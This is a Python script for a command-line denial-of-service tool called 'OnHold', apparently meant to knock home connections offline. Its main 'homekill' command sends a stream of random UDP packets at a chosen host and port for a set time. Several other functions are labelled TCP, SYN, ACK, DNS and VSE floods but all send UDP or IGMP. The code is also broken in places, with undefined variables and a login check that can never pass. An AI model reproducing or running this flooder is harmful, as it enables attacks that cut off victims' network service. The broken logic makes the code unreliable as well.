#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os


banner = """
                        \033[31m╔═╗╔╗╔╦ ╦\033[37m╔═╗╦  ╔╦╗            
                        \033[31m║ ║║║║╠═╣\033[37m║ ║║   ║║            
                        \033[31m╚═╝╝╚╝╩ ╩\033[37m╚═╝╩═╝═╩╝            
                   ☎️  \033[31mPut those m\033[37mfs on hold ☎️
            \033[31m╔════════════════════════════════════════╗
            \033[31m║   \033[37mhomekill {ip} {port} {time} {2048}   \033[31m║
            \033[31m╚════════════════════════════════════════╝
"""

fsubs = True
liips = True
tattacks = True
uaid = True
said = True
iaid = True
haid = True
aid = True
attack = True
udp = True
tcp = True
syn = True
std = True
homekill = True                                                

#methods
def udpsender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000

def tcpsender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and tcp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1

def synsender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000
  
def acksender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and ack and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000

def dnssender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and dns and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000

def vsesender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and std and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000

def stdsender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and std and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000

#globals
def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global ovh
	global gamenuke
	global http

	while True:
		sys.stdout.write("\x1b]2;| LIVE: ONHOLD HomeHolder | By @d3fe4ted, ENJOY! | \x07")
		sin = input("\033[32muser\033[37m@\033[31monh\033[37mold~ ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "exit":
			print ("\033[32muser\033[37m@\033[31monh\033[37mold~  You Are Exiting Out Of OnHold Client.\n")
			exit()
		elif sinput == "attacks":
			print ("\033Total Attacks Running: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("\033[31m[ONH\033[37mOLD] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
			main()
		elif sinput == "homekill":
			if username == "Guest":
				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "stop":
			print ("\033[31m[ONH\033[37mOLD] All Running Attacks Have Been Stopped.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stopping All homekill Attacks.\n")
				homekill = False
				while not udp:
					if aid == 0:
						print ("\033[31m[ONH\033[37mOLD] No homekill Processes Running.")
						homekill = True
						main()
			if what == "ovh":
				print ("Stopping All ovhdown Attacks.\n")
				icmp = False
				while not ovh:
					print ("\033[31m[ONH\033[37mOLD] No ovh Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[31mSkidiot\033[00m] {} isn't a command.".format(sinput))
			main()



try:
	users = "root"
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, Dick face its {root}.\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = [""]
	password = getpass.getpass ("[+] Password: ")
	if user == "":
		if password == passwords[0]:
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\033[31m[ONH\033[37mOLD] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[*] Incorrect\n")
			exit()
except KeyboardInterrupt:
	exit()